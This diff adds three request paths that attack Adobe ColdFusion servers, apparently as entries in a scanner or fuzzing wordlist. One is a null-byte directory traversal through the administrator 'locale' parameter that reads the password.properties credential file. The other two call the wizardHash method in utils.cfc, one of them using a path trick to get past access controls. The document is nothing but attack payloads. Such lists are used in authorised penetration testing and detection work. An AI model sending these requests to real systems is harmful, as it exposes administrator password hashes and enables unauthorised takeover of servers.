@@ -1,0 +1,3 @@
+/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
